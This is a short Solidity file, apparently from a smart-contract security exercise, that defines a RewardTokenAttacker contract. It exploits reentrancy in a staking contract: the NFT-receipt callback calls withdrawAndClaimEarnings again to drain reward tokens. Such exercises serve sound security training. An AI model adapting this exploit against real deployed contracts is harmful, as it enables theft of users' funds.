// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../RewardToken.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract RewardTokenAttacker is IERC721Receiver {
    NftToStake NFT;
    Depositoor depositor;
    RewardToken rewardToken;
    function sendNFT(address _nft, address _depositor, address _rewardToken) public {
        rewardToken = RewardToken(_rewardToken);
        NFT = NftToStake(_nft);
        NFT.safeTransferFrom(address(this), _depositor, 42);
    }

    function attack(address _depositor) public {
        depositor = Depositoor(_depositor);
        depositor.withdrawAndClaimEarnings(42);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        if (rewardToken.balanceOf(address(depositor)) > 0) {
            depositor.withdrawAndClaimEarnings(42);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
